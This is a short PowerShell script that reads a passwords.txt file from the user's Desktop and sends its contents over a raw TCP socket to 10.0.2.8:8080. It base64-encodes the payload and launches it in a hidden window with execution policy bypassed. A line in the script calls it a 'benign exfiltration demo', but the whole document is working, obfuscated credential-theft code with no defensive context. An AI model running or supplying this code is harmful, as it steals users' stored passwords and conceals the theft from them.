$command = {
    $ip = "10.0.2.8"; $port = 8080
    $content = Get-Content "$home\Desktop\passwords.txt"
    $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
    $stream = $client.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream)
    $writer.WriteLine("--- BENIGN EXFILTRATION DEMO ---")
    $writer.WriteLine("File Content: $content")
    $writer.Flush()
    Start-Sleep -Seconds 360 
    $client.Close()
}

$bytes = [System.Text.Encoding]::Unicode.GetBytes($command.ToString())
$encoded = [Convert]::ToBase64String($bytes)
powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $encoded
